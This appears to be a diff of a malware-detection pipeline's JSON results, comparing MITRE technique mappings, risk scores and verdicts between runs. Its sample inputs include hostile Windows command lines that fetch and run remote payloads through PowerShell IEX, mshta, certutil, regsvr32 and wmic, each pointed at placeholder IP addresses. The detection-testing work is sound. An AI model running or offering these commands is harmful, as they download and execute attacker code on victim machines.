@@ -66,14 +66,11 @@
           ],
           "mitre_ids": [
             "T1027",
-            "T1059.001",
-            "T1105",
-            "T1140",
-            "T1562.001",
-            "T1564.003"
+            "T1027.010",
+            "T1059.001"
           ],
           "risk_level": "high",
-          "risk_score_bucket": 100,
+          "risk_score_bucket": 80,
           "verdict_label": "Malicious"
         },
         "run2_snapshot": {
@@ -134,14 +131,11 @@
           ],
           "mitre_ids": [
             "T1027",
-            "T1059.001",
-            "T1105",
-            "T1140",
-            "T1562.001",
-            "T1564.003"
+            "T1027.010",
+            "T1059.001"
           ],
           "risk_level": "high",
-          "risk_score_bucket": 100,
+          "risk_score_bucket": 80,
           "verdict_label": "Malicious"
         },
         "upload_dedup_flipped": false
@@ -181,131 +175,31 @@
             ],
             "mitre": [
               {
-                "evidence": "PowerShell -EncodedCommand or Base64 payload.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1027",
-                    "evidence_ref": "ev-083be87a5511",
-                    "field": "analyzer_evidence",
-                    "observed_value": "PowerShell -EncodedCommand or Base64 payload.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1027",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Defense Evasion",
-                "technique": "Obfuscated Files or Information"
-              },
-              {
-                "evidence": "-WindowStyle Hidden.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1564.003",
-                    "evidence_ref": "ev-727f6c6a31f6",
-                    "field": "analyzer_evidence",
-                    "observed_value": "-WindowStyle Hidden.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1564.003",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Defense Evasion",
-                "technique": "Hide Artifacts: Hidden Window"
-              },
-              {
-                "evidence": "ExecutionPolicy Bypass / Unrestricted.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1562.001",
-                    "evidence_ref": "ev-9c2a9f182f04",
-                    "field": "analyzer_evidence",
-                    "observed_value": "ExecutionPolicy Bypass / Unrestricted.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1562.001",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Defense Evasion",
-                "technique": "Disable or Modify Tools"
-              },
-              {
-                "evidence": "Invoke-Expression / IEX / & alias.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1059.001",
-                    "evidence_ref": "ev-1deda02cd400",
-                    "field": "analyzer_evidence",
-                    "observed_value": "Invoke-Expression / IEX / & alias.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
                 "id": "T1059.001",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
                 "tactic": "Execution",
                 "technique": "PowerShell"
               },
               {
-                "evidence": "Download cradle (WebClient / iwr / curl).",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1105",
-                    "evidence_ref": "ev-aef15a12bb92",
-                    "field": "analyzer_evidence",
-                    "observed_value": "Download cradle (WebClient / iwr / curl).",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1105",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Command and Control",
-                "technique": "Ingress Tool Transfer"
+                "id": "T1027.010",
+                "tactic": "Defense Evasion",
+                "technique": "Command Obfuscation: Base64/Encoded Command"
               },
               {
-                "evidence": "Recursive base64 decode surfaced 2 additional evidence element(s) across nested layer(s).",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1140",
-                    "evidence_ref": "ev-2f18b9fe8e72",
-                    "field": "analyzer_evidence",
-                    "observed_value": "Recursive base64 decode surfaced 2 additional evidence element(s) across nested layer(s).",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1140",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
+                "id": "T1027",
                 "tactic": "Defense Evasion",
-                "technique": "Deobfuscate/Decode Files or Information"
+                "technique": "Standalone long base64 blob (>=200 chars) \u2014 likely encoded payload"
               }
             ],
-            "mitre_provenance": {
-              "regex_extra": [
-                "T1027.010"
-              ],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
             "osint": null,
             "risk": {
               "level": "high",
-              "score": 100,
+              "score": 76,
               "verdict": "Malicious"
             },
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.098,
+              "elapsed_ms": 0.113,
               "status": "ok"
             },
             "yara": [
@@ -335,7 +229,7 @@
               }
             ]
           },
-          "elapsed_ms": 200.5,
+          "elapsed_ms": 192.2,
           "status": 200
         },
         "die": {
@@ -690,7 +584,7 @@
               ]
             }
           },
-          "elapsed_ms": 137.3,
+          "elapsed_ms": 188.5,
           "status": 200
         },
         "narrate": {
@@ -755,7 +649,7 @@
               ]
             }
           },
-          "elapsed_ms": 139.0,
+          "elapsed_ms": 147.1,
           "status": 200
         },
         "upload": {
@@ -783,7 +677,7 @@
             ],
             "text": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
           },
-          "elapsed_ms": 148.5,
+          "elapsed_ms": 191.7,
           "status": 200
         }
       },
@@ -822,125 +716,25 @@
             ],
             "mitre": [
               {
-                "evidence": "PowerShell -EncodedCommand or Base64 payload.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1027",
-                    "evidence_ref": "ev-083be87a5511",
-                    "field": "analyzer_evidence",
-                    "observed_value": "PowerShell -EncodedCommand or Base64 payload.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1027",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Defense Evasion",
-                "technique": "Obfuscated Files or Information"
-              },
-              {
-                "evidence": "-WindowStyle Hidden.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1564.003",
-                    "evidence_ref": "ev-727f6c6a31f6",
-                    "field": "analyzer_evidence",
-                    "observed_value": "-WindowStyle Hidden.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1564.003",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Defense Evasion",
-                "technique": "Hide Artifacts: Hidden Window"
-              },
-              {
-                "evidence": "ExecutionPolicy Bypass / Unrestricted.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1562.001",
-                    "evidence_ref": "ev-9c2a9f182f04",
-                    "field": "analyzer_evidence",
-                    "observed_value": "ExecutionPolicy Bypass / Unrestricted.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1562.001",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Defense Evasion",
-                "technique": "Disable or Modify Tools"
-              },
-              {
-                "evidence": "Invoke-Expression / IEX / & alias.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1059.001",
-                    "evidence_ref": "ev-1deda02cd400",
-                    "field": "analyzer_evidence",
-                    "observed_value": "Invoke-Expression / IEX / & alias.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
                 "id": "T1059.001",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
                 "tactic": "Execution",
                 "technique": "PowerShell"
               },
               {
-                "evidence": "Download cradle (WebClient / iwr / curl).",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1105",
-                    "evidence_ref": "ev-aef15a12bb92",
-                    "field": "analyzer_evidence",
-                    "observed_value": "Download cradle (WebClient / iwr / curl).",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1105",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Command and Control",
-                "technique": "Ingress Tool Transfer"
+                "id": "T1027.010",
+                "tactic": "Defense Evasion",
+                "technique": "Command Obfuscation: Base64/Encoded Command"
               },
               {
-                "evidence": "Recursive base64 decode surfaced 2 additional evidence element(s) across nested layer(s).",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1140",
-                    "evidence_ref": "ev-2f18b9fe8e72",
-                    "field": "analyzer_evidence",
-                    "observed_value": "Recursive base64 decode surfaced 2 additional evidence element(s) across nested layer(s).",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1140",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
+                "id": "T1027",
                 "tactic": "Defense Evasion",
-                "technique": "Deobfuscate/Decode Files or Information"
+                "technique": "Standalone long base64 blob (>=200 chars) \u2014 likely encoded payload"
               }
             ],
-            "mitre_provenance": {
-              "regex_extra": [
-                "T1027.010"
-              ],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
             "osint": null,
             "risk": {
               "level": "high",
-              "score": 100,
+              "score": 76,
               "verdict": "Malicious"
             },
             "ti_hits": [],
@@ -976,7 +770,7 @@
               }
             ]
           },
-          "elapsed_ms": 159.0,
+          "elapsed_ms": 154.6,
           "status": 200
         },
         "die": {
@@ -1331,7 +1125,7 @@
               ]
             }
           },
-          "elapsed_ms": 122.6,
+          "elapsed_ms": 133.7,
           "status": 200
         },
         "narrate": {
@@ -1396,7 +1190,7 @@
               ]
             }
           },
-          "elapsed_ms": 94.0,
+          "elapsed_ms": 106.8,
           "status": 200
         },
         "upload": {
@@ -1424,7 +1218,7 @@
             ],
             "text": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
           },
-          "elapsed_ms": 177.3,
+          "elapsed_ms": 273.7,
           "status": 200
         }
       }
@@ -1476,9 +1270,12 @@
           "lolbas_bins": [
             "mshta.exe"
           ],
-          "mitre_ids": [],
+          "mitre_ids": [
+            "T1218.005",
+            "T1566.001"
+          ],
           "risk_level": "high",
-          "risk_score_bucket": 80,
+          "risk_score_bucket": 100,
           "verdict_label": "Malicious"
         },
         "run2_snapshot": {
@@ -1521,9 +1318,12 @@
           "lolbas_bins": [
             "mshta.exe"
           ],
-          "mitre_ids": [],
+          "mitre_ids": [
+            "T1218.005",
+            "T1566.001"
+          ],
           "risk_level": "high",
-          "risk_score_bucket": 80,
+          "risk_score_bucket": 100,
           "verdict_label": "Malicious"
         },
         "upload_dedup_flipped": false
@@ -1564,25 +1364,28 @@
                 "url": "https://lolbas-project.github.io/lolbas/Binaries/mshta/"
               }
             ],
-            "mitre": [],
-            "mitre_provenance": {
-              "regex_extra": [
-                "T1218.005",
-                "T1566.001"
-              ],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
+            "mitre": [
+              {
+                "id": "T1218.005",
+                "tactic": "Defense Evasion",
+                "technique": "Mshta"
+              },
+              {
+                "id": "T1566.001",
+                "tactic": "Initial Access",
+                "technique": "Malicious attachment / delivery vehicle (ISO/IMG/HTA/LNK/SCR/VBS/WSF/JAR or double-extension lure)"
+              }
+            ],
             "osint": null,
             "risk": {
               "level": "high",
-              "score": 77,
+              "score": 100,
               "verdict": "Malicious"
             },
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 501.112,
+              "elapsed_ms": 501.087,
               "status": "timeout"
             },
             "yara": [
@@ -1600,7 +1403,7 @@
               }
             ]
           },
-          "elapsed_ms": 760.9,
+          "elapsed_ms": 681.6,
           "status": 200
         },
         "die": {
@@ -1786,7 +1589,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 97.1,
+          "elapsed_ms": 105.7,
           "status": 200
         },
         "narrate": {
@@ -1820,7 +1623,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 124.5,
+          "elapsed_ms": 93.9,
           "status": 200
         },
         "upload": {
@@ -1848,7 +1651,7 @@
             ],
             "text": "mshta.exe http://198.51.100.23/dropper.hta"
           },
-          "elapsed_ms": 135.7,
+          "elapsed_ms": 100.1,
           "status": 200
         }
       },
@@ -1888,25 +1691,28 @@
                 "url": "https://lolbas-project.github.io/lolbas/Binaries/mshta/"
               }
             ],
-            "mitre": [],
-            "mitre_provenance": {
-              "regex_extra": [
-                "T1218.005",
-                "T1566.001"
-              ],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
+            "mitre": [
+              {
+                "id": "T1218.005",
+                "tactic": "Defense Evasion",
+                "technique": "Mshta"
+              },
+              {
+                "id": "T1566.001",
+                "tactic": "Initial Access",
+                "technique": "Malicious attachment / delivery vehicle (ISO/IMG/HTA/LNK/SCR/VBS/WSF/JAR or double-extension lure)"
+              }
+            ],
             "osint": null,
             "risk": {
               "level": "high",
-              "score": 77,
+              "score": 100,
               "verdict": "Malicious"
             },
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 501.666,
+              "elapsed_ms": 501.525,
               "status": "timeout"
             },
             "yara": [
@@ -1924,7 +1730,7 @@
               }
             ]
           },
-          "elapsed_ms": 677.9,
+          "elapsed_ms": 652.8,
           "status": 200
         },
         "die": {
@@ -2110,7 +1916,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 98.8,
+          "elapsed_ms": 190.2,
           "status": 200
         },
         "narrate": {
@@ -2144,7 +1950,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 108.5,
+          "elapsed_ms": 94.5,
           "status": 200
         },
         "upload": {
@@ -2172,7 +1978,7 @@
             ],
             "text": "mshta.exe http://198.51.100.23/dropper.hta"
           },
-          "elapsed_ms": 115.3,
+          "elapsed_ms": 133.9,
           "status": 200
         }
       }
@@ -2356,29 +2162,11 @@
             ],
             "mitre": [
               {
-                "evidence": "CMD download cradle (curl/certutil/bitsadmin/powershell).",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1105",
-                    "evidence_ref": "ev-d74e960712f3",
-                    "field": "analyzer_evidence",
-                    "observed_value": "CMD download cradle (curl/certutil/bitsadmin/powershell).",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
                 "id": "T1105",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
                 "tactic": "Command and Control",
                 "technique": "Ingress Tool Transfer"
               }
             ],
-            "mitre_provenance": {
-              "regex_extra": [],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
             "osint": null,
             "risk": {
               "level": "high",
@@ -2388,7 +2176,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 501.029,
+              "elapsed_ms": 501.534,
               "status": "timeout"
             },
             "yara": [
@@ -2400,7 +2188,7 @@
               }
             ]
           },
-          "elapsed_ms": 681.9,
+          "elapsed_ms": 652.6,
           "status": 200
         },
         "die": {
@@ -2621,7 +2409,7 @@
               ]
             }
           },
-          "elapsed_ms": 96.9,
+          "elapsed_ms": 113.9,
           "status": 200
         },
         "narrate": {
@@ -2681,7 +2469,7 @@
               ]
             }
           },
-          "elapsed_ms": 126.5,
+          "elapsed_ms": 102.8,
           "status": 200
         },
         "upload": {
@@ -2709,7 +2497,7 @@
             ],
             "text": "certutil.exe -urlcache -split -f http://203.0.113.15/payload.exe C:\\Users\\Public\\update.exe"
           },
-          "elapsed_ms": 100.8,
+          "elapsed_ms": 100.1,
           "status": 200
         }
       },
@@ -2771,29 +2559,11 @@
             ],
             "mitre": [
               {
-                "evidence": "CMD download cradle (curl/certutil/bitsadmin/powershell).",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1105",
-                    "evidence_ref": "ev-d74e960712f3",
-                    "field": "analyzer_evidence",
-                    "observed_value": "CMD download cradle (curl/certutil/bitsadmin/powershell).",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
                 "id": "T1105",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
                 "tactic": "Command and Control",
                 "technique": "Ingress Tool Transfer"
               }
             ],
-            "mitre_provenance": {
-              "regex_extra": [],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
             "osint": null,
             "risk": {
               "level": "high",
@@ -2803,7 +2573,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 501.205,
+              "elapsed_ms": 501.82,
               "status": "timeout"
             },
             "yara": [
@@ -2815,7 +2585,7 @@
               }
             ]
           },
-          "elapsed_ms": 676.5,
+          "elapsed_ms": 655.5,
           "status": 200
         },
         "die": {
@@ -3036,7 +2806,7 @@
               ]
             }
           },
-          "elapsed_ms": 99.0,
+          "elapsed_ms": 109.2,
           "status": 200
         },
         "narrate": {
@@ -3096,7 +2866,7 @@
               ]
             }
           },
-          "elapsed_ms": 96.3,
+          "elapsed_ms": 93.1,
           "status": 200
         },
         "upload": {
@@ -3124,7 +2894,7 @@
             ],
             "text": "certutil.exe -urlcache -split -f http://203.0.113.15/payload.exe C:\\Users\\Public\\update.exe"
           },
-          "elapsed_ms": 99.4,
+          "elapsed_ms": 99.8,
           "status": 200
         }
       }
@@ -3177,10 +2947,13 @@
             "regsvr32.exe",
             "scrobj.dll"
           ],
-          "mitre_ids": [],
-          "risk_level": "medium",
-          "risk_score_bucket": 60,
-          "verdict_label": "Suspicious"
+          "mitre_ids": [
+            "T1105",
+            "T1218.010"
+          ],
+          "risk_level": "high",
+          "risk_score_bucket": 100,
+          "verdict_label": "Malicious"
         },
         "run2_snapshot": {
           "evidence_count": 0,
@@ -3223,10 +2996,13 @@
             "regsvr32.exe",
             "scrobj.dll"
           ],
-          "mitre_ids": [],
-          "risk_level": "medium",
-          "risk_score_bucket": 60,
-          "verdict_label": "Suspicious"
+          "mitre_ids": [
+            "T1105",
+            "T1218.010"
+          ],
+          "risk_level": "high",
+          "risk_score_bucket": 100,
+          "verdict_label": "Malicious"
         },
         "upload_dedup_flipped": false
       },
@@ -3279,25 +3055,28 @@
                 "url": "https://lolbas-project.github.io/lolbas/Libraries/Scrobj/"
               }
             ],
-            "mitre": [],
-            "mitre_provenance": {
-              "regex_extra": [
-                "T1105",
-                "T1218.010"
-              ],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
+            "mitre": [
+              {
+                "id": "T1218.010",
+                "tactic": "Defense Evasion",
+                "technique": "Regsvr32 (Squiblydoo)"
+              },
+              {
+                "id": "T1105",
+                "tactic": "Command and Control",
+                "technique": "Ingress Tool Transfer"
+              }
+            ],
             "osint": null,
             "risk": {
-              "level": "medium",
-              "score": 60,
-              "verdict": "Suspicious"
+              "level": "high",
+              "score": 96,
+              "verdict": "Malicious"
             },
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 500.805,
+              "elapsed_ms": 501.723,
               "status": "timeout"
             },
             "yara": [
@@ -3309,7 +3088,7 @@
               }
             ]
           },
-          "elapsed_ms": 652.4,
+          "elapsed_ms": 650.7,
           "status": 200
         },
         "die": {
@@ -3562,7 +3341,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 111.3,
+          "elapsed_ms": 110.0,
           "status": 200
         },
         "narrate": {
@@ -3615,7 +3394,7 @@
               ]
             }
           },
-          "elapsed_ms": 136.0,
+          "elapsed_ms": 95.8,
           "status": 200
         },
         "upload": {
@@ -3643,7 +3422,7 @@
             ],
             "text": "regsvr32.exe /s /n /u /i:http://198.51.100.99/backdoor.sct scrobj.dll"
           },
-          "elapsed_ms": 107.4,
+          "elapsed_ms": 156.2,
           "status": 200
         }
       },
@@ -3696,25 +3475,28 @@
                 "url": "https://lolbas-project.github.io/lolbas/Libraries/Scrobj/"
               }
             ],
-            "mitre": [],
-            "mitre_provenance": {
-              "regex_extra": [
-                "T1105",
-                "T1218.010"
-              ],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
+            "mitre": [
+              {
+                "id": "T1218.010",
+                "tactic": "Defense Evasion",
+                "technique": "Regsvr32 (Squiblydoo)"
+              },
+              {
+                "id": "T1105",
+                "tactic": "Command and Control",
+                "technique": "Ingress Tool Transfer"
+              }
+            ],
             "osint": null,
             "risk": {
-              "level": "medium",
-              "score": 60,
-              "verdict": "Suspicious"
+              "level": "high",
+              "score": 96,
+              "verdict": "Malicious"
             },
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 501.019,
+              "elapsed_ms": 501.588,
               "status": "timeout"
             },
             "yara": [
@@ -3726,7 +3508,7 @@
               }
             ]
           },
-          "elapsed_ms": 653.2,
+          "elapsed_ms": 648.1,
           "status": 200
         },
         "die": {
@@ -3979,7 +3761,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 109.3,
+          "elapsed_ms": 117.8,
           "status": 200
         },
         "narrate": {
@@ -4032,7 +3814,7 @@
               ]
             }
           },
-          "elapsed_ms": 95.6,
+          "elapsed_ms": 92.4,
           "status": 200
         },
         "upload": {
@@ -4060,7 +3842,7 @@
             ],
             "text": "regsvr32.exe /s /n /u /i:http://198.51.100.99/backdoor.sct scrobj.dll"
           },
-          "elapsed_ms": 107.7,
+          "elapsed_ms": 98.8,
           "status": 200
         }
       }
@@ -4131,9 +3913,10 @@
             "wmic.exe"
           ],
           "mitre_ids": [
+            "T1047",
             "T1059.001",
-            "T1105",
-            "T1564.003"
+            "T1059.003",
+            "T1105"
           ],
           "risk_level": "high",
           "risk_score_bucket": 100,
@@ -4198,9 +3981,10 @@
             "wmic.exe"
           ],
           "mitre_ids": [
+            "T1047",
             "T1059.001",
-            "T1105",
-            "T1564.003"
+            "T1059.003",
+            "T1105"
           ],
           "risk_level": "high",
           "risk_score_bucket": 100,
@@ -4275,68 +4059,26 @@
             ],
             "mitre": [
               {
-                "evidence": "Invoke-Expression / IEX / & alias.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1059.001",
-                    "evidence_ref": "ev-1deda02cd400",
-                    "field": "analyzer_evidence",
-                    "observed_value": "Invoke-Expression / IEX / & alias.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1059.001",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
+                "id": "T1059.003",
                 "tactic": "Execution",
-                "technique": "PowerShell"
+                "technique": "Windows Command Shell"
               },
               {
-                "evidence": "Download cradle (WebClient / iwr / curl).",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1105",
-                    "evidence_ref": "ev-aef15a12bb92",
-                    "field": "analyzer_evidence",
-                    "observed_value": "Download cradle (WebClient / iwr / curl).",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
                 "id": "T1105",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
                 "tactic": "Command and Control",
                 "technique": "Ingress Tool Transfer"
               },
               {
-                "evidence": "-WindowStyle Hidden.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1564.003",
-                    "evidence_ref": "ev-727f6c6a31f6",
-                    "field": "analyzer_evidence",
-                    "observed_value": "-WindowStyle Hidden.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1564.003",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Defense Evasion",
-                "technique": "Hide Artifacts: Hidden Window"
+                "id": "T1059.001",
+                "tactic": "Execution",
+                "technique": "PowerShell (hidden)"
+              },
+              {
+                "id": "T1047",
+                "tactic": "Execution",
+                "technique": "wmic process call create fragment (remote/local process spawn)"
               }
             ],
-            "mitre_provenance": {
-              "regex_extra": [
-                "T1047",
-                "T1059.003"
-              ],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
             "osint": null,
             "risk": {
               "level": "high",
@@ -4346,7 +4088,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 502.073,
+              "elapsed_ms": 501.389,
               "status": "timeout"
             },
             "yara": [
@@ -4376,7 +4118,7 @@
               }
             ]
           },
-          "elapsed_ms": 685.3,
+          "elapsed_ms": 647.6,
           "status": 200
         },
         "die": {
@@ -4781,7 +4523,7 @@
               ]
             }
           },
-          "elapsed_ms": 101.8,
+          "elapsed_ms": 96.6,
           "status": 200
         },
         "narrate": {
@@ -4857,7 +4599,7 @@
               ]
             }
           },
-          "elapsed_ms": 92.5,
+          "elapsed_ms": 101.8,
           "status": 200
         },
         "upload": {
@@ -4885,7 +4627,7 @@
             ],
             "text": "wmic.exe /node:\"WORKSTATION-04\" process call create \"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.7/b.ps1')\""
           },
-          "elapsed_ms": 104.7,
+          "elapsed_ms": 103.9,
           "status": 200
         }
       },
@@ -4956,68 +4698,26 @@
             ],
             "mitre": [
               {
-                "evidence": "Invoke-Expression / IEX / & alias.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1059.001",
-                    "evidence_ref": "ev-1deda02cd400",
-                    "field": "analyzer_evidence",
-                    "observed_value": "Invoke-Expression / IEX / & alias.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1059.001",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
+                "id": "T1059.003",
                 "tactic": "Execution",
-                "technique": "PowerShell"
+                "technique": "Windows Command Shell"
               },
               {
-                "evidence": "Download cradle (WebClient / iwr / curl).",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1105",
-                    "evidence_ref": "ev-aef15a12bb92",
-                    "field": "analyzer_evidence",
-                    "observed_value": "Download cradle (WebClient / iwr / curl).",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
                 "id": "T1105",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
                 "tactic": "Command and Control",
                 "technique": "Ingress Tool Transfer"
               },
               {
-                "evidence": "-WindowStyle Hidden.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1564.003",
-                    "evidence_ref": "ev-727f6c6a31f6",
-                    "field": "analyzer_evidence",
-                    "observed_value": "-WindowStyle Hidden.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1564.003",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Defense Evasion",
-                "technique": "Hide Artifacts: Hidden Window"
+                "id": "T1059.001",
+                "tactic": "Execution",
+                "technique": "PowerShell (hidden)"
+              },
+              {
+                "id": "T1047",
+                "tactic": "Execution",
+                "technique": "wmic process call create fragment (remote/local process spawn)"
               }
             ],
-            "mitre_provenance": {
-              "regex_extra": [
-                "T1047",
-                "T1059.003"
-              ],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
             "osint": null,
             "risk": {
               "level": "high",
@@ -5027,7 +4727,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 501.414,
+              "elapsed_ms": 519.541,
               "status": "timeout"
             },
             "yara": [
@@ -5057,7 +4757,7 @@
               }
             ]
           },
-          "elapsed_ms": 708.9,
+          "elapsed_ms": 674.3,
           "status": 200
         },
         "die": {
@@ -5462,7 +5162,7 @@
               ]
             }
           },
-          "elapsed_ms": 121.2,
+          "elapsed_ms": 108.1,
           "status": 200
         },
         "narrate": {
@@ -5538,7 +5238,7 @@
               ]
             }
           },
-          "elapsed_ms": 108.5,
+          "elapsed_ms": 99.7,
           "status": 200
         },
         "upload": {
@@ -5566,7 +5266,7 @@
             ],
             "text": "wmic.exe /node:\"WORKSTATION-04\" process call create \"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.7/b.ps1')\""
           },
-          "elapsed_ms": 110.9,
+          "elapsed_ms": 143.4,
           "status": 200
         }
       }
@@ -5605,9 +5305,11 @@
             "urls": 0
           },
           "lolbas_bins": [],
-          "mitre_ids": [],
+          "mitre_ids": [
+            "T1119"
+          ],
           "risk_level": "safe",
-          "risk_score_bucket": 0,
+          "risk_score_bucket": 10,
           "verdict_label": "Benign"
         },
         "run2_snapshot": {
@@ -5637,9 +5339,11 @@
             "urls": 0
           },
           "lolbas_bins": [],
-          "mitre_ids": [],
+          "mitre_ids": [
+            "T1119"
+          ],
           "risk_level": "safe",
-          "risk_score_bucket": 0,
+          "risk_score_bucket": 10,
           "verdict_label": "Benign"
         },
         "upload_dedup_flipped": false
@@ -5661,24 +5365,23 @@
               "urls": []
             },
             "lolbas": [],
-            "mitre": [],
-            "mitre_provenance": {
-              "regex_extra": [
-                "T1119"
